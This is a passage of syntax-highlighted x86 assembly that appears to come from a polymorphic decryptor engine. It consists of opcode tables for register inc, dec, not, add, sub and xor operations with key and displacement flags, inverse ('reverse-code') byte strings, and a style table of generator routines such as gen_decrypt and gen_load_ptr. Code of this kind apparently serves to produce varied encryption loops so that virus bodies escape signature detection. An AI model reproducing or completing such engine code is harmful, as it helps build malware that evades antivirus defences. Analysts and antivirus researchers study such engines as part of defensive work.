                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">
                  
</span><span class="sc5">xx_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">94h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Reverse-code strings</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">x_inc_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_add_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">

                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Format for each style-table entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h -&gt; DWORD -&gt; Address of generator</span><span class="sc0">
                </span><span class="sc1">; 04h -&gt; DWORD -&gt; Address of generated subroutine or</span><span class="sc0">
                </span><span class="sc1">;                 00000000h if not yet generated</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">style_table</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ptr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

